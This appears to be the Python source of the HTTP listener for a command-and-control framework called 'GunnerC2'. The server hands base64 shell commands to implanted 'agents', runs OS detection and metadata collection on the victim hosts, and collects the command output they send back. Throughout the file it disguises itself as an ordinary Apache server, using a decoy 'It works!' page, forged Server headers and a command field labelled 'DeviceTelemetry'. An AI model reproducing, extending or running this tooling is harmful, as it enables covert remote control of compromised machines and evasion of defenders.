import json
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
from socketserver import ThreadingMixIn
from core import utils
from core.session_handlers import session_manager
import random
import string
import os,sys,subprocess
from core.session_handlers.session_manager import kill_http_session
from core.prompt_manager import prompt_manager
import re
import queue
import time
import traceback, binascii

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

PROMPT = brightblue + "GunnerC2 > " + brightblue

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


def _serve_benign(self):
    """
    Send back a minimal HTML page *with* typical Apache-style headers
    so casual inspection looks like any other PHP site.
    """
    self.send_response(200)
    # Standard date & server
    self.send_header("Date",    self.date_time_string())
    self.send_header("Server",  "Apache/2.4.41 (Ubuntu)")
    # Keep-alive looks normal
    self.send_header("Connection", "keep-alive")
    # Typical text/html PHP response
    self.send_header("Content-Type", "text/html; charset=UTF-8")
    self.end_headers()
    # A trivial “not found”-style body (you can swap in your own index.php HTML)
    self.wfile.write(b"""
<html>
 <head><title>Welcome</title></head>
 <body>
   <h1>It works!</h1>
   <p>Apache/2.4.41 Server at example.com Port 80</p>
 </body>
</html>
""")

class C2HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            headers = self.headers

            # only treat / or *.php as our C2 endpoint
            path = self.path.split('?', 1)[0].lower()
            if not (path == '/' or path.endswith('.php')):
                return _serve_benign(self)

            # pull session‐ID from any of our three headers
            sid = None
            for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
                sid = self.headers.get(hdr)
                if sid:
                    break

            if not sid:
                # no C2 header → normal browser GET
                return _serve_benign(self)

            if sid and sid in session_manager.dead_sessions:
                # 410 Gone tells the implant “never come back”
                self.send_response(410, "Gone")
                self.end_headers()
                return

            if sid not in session_manager.sessions:
                if getattr(self.server, "scheme", "http") == "https":
                    session_manager.register_https_session(sid)
                    utils.async_note(brightgreen + f"[+] New HTTPS agent: {sid}", prompt_manager.get_prompt(), reprint=True)
                else:
                    session_manager.register_http_session(sid)
                    utils.async_note(brightgreen + f"[+] New HTTP agent: {sid}", prompt_manager.get_prompt(), reprint=True)

            session = session_manager.sessions[sid]
            
            try:
                cmd_b64 = session.meta_command_queue.get_nowait()
                session.last_cmd_type = "meta"

            except queue.Empty:
                # 2) if none, pull your interactive command
                try:
                    cmd_b64 = session.command_queue.get_nowait()
                    session.last_cmd_type = "cmd"

                except queue.Empty:
                    cmd_b64 = ""

            payload_dict = {
                "cmd": cmd_b64,
                "DeviceTelemetry": {
                    "Telemetry": cmd_b64
                }
            }

            payload = json.dumps(payload_dict).encode()
            self.send_response(200)
            # mimic a JSON-API content type
            self.send_header("Date",    self.date_time_string())
            self.send_header("Server",  "Apache/2.4.41 (Ubuntu)")
            self.send_header("Connection", "close")
            self.send_header("Content-Type",   "application/json; charset=UTF-8")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        except (ConnectionResetError, BrokenPipeError):
            print(brightred + f"[!] Connection reset during GET request")

        except Exception as e:
            print(brightred + f"[!] Exception in do_GET: {e}")

    def do_POST(self):
        try:
            # only treat / or *.php as our C2 endpoint
            path = self.path.split('?', 1)[0].lower()
            if not (path == '/' or path.endswith('.php')):
                return _serve_benign(self)

            # pull session‐ID from any of our three headers
            sid = None
            for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
                sid = self.headers.get(hdr)
                if sid:
                    break

            if not sid:
                # no C2 header → normal browser POST
                return _serve_benign(self)

            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)

            try:
                try:
                    msg = json.loads(body)
                    #print(f"[DEBUG] Parsed JSON: {msg}")
                    
                except json.JSONDecodeError as e:
                    print(f"[!] JSON decode error: {e}")
                    self.send_response(400)
                    self.end_headers()
                    return

                output_b64 = msg.get("output", "") or ""

                try:
                    output = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()

                except (TypeError, binascii.Error) as e:
                    # either raw was None or invalid base64
                    output = ""

                except Exception as e:
                    print("Failed to decode base64")

                session = session_manager.sessions[sid]


                """cwd = msg.get("cwd")
                user = msg.get("user")
                host = msg.get("host")

                if cwd: session.metadata["cwd"] = cwd
                if user: session.metadata["user"] = user
                if host: session.metadata["hostname"] = host"""

                # Handle OS detection first
                last_mode = session.last_cmd_type
                if last_mode == "meta":
                    if session.mode == "detect_os":
                        #print(f"[DEBUG] HTTP agent {sid} OS check: {output}")
                        session.detect_os(output)

                        # Queue OS-specific metadata commands
                        for _, cmd in session.os_metadata_commands:
                            encoded_meta_command = base64.b64encode(cmd.encode()).decode()
                            session.meta_command_queue.put(encoded_meta_command)

                        session.mode = "metadata"
                        session.metadata_stage = 0
                        self.send_response(200)
                        self.send_header("Content-Length", "0")
                        self.end_headers()
                        return

                    # Handle metadata collection
                    if session.metadata_stage < len(session.metadata_fields):
                        field = session.metadata_fields[session.metadata_stage]
                        lines = [
                            line.strip()
                            for line in output.splitlines()
                            if line.strip() not in ("$", "#", ">") and line.strip() != ""
                        ]

                        if len(lines) > 1:
                            clean = lines[1] if lines else ""
                            session.metadata[field] = clean
                            session.metadata_stage += 1

                        elif len(lines) == 1:
                            clean = lines[0] if lines else ""
                            session.metadata[field] = clean
                            session.metadata_stage += 1

                        else:
                            pass
                        #print(brightred + f"[!] Failed to execute metadata collecting commands!")

                    else:
                        session.mode = "cmd"
                        last_mode = "cmd"
                        session.collection = 1

                elif last_mode == "cmd":
                    if output_b64:
                        session.output_queue.put(output_b64)

                else:
                    pass

                #session.last_cmd_type = None

                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()

            except Exception as e:
                print(f"error: {e}")
                print("HIT 400 ERROR")
                self.send_response(400)
                self.end_headers()

        except (ConnectionResetError, BrokenPipeError):
            print(brightred + f"[!] Connection reset during POST request")

        except Exception as e:
            print(brightred + f"[!] Exception in do_POST: {e}")
            self.send_response(400)
            self.end_headers()

    def log_message(self, *args):
        return

def start_http_listener(ip, port):
    try:
        utils.async_note(brightyellow + f"[+] HTTP listener started on {ip}:{port}", prompt_manager.get_prompt())
        #sys.stdout.write(PROMPT)
        #sys.stdout.flush()
        httpd = ThreadingHTTPServer((ip, port), C2HTTPRequestHandler)
        utils.http_listener_sockets[f"http-{ip}:{port}"] = httpd
        httpd.serve_forever()

    except (ConnectionResetError, BrokenPipeError):
            print(brightred + f"[!] Connection reset from one of your agents!")

def generate_http_session_id():
    parts = []
    for _ in range(3):
        parts.append(''.join(random.choices(string.ascii_lowercase + string.digits, k=5)))
    return '-'.join(parts)
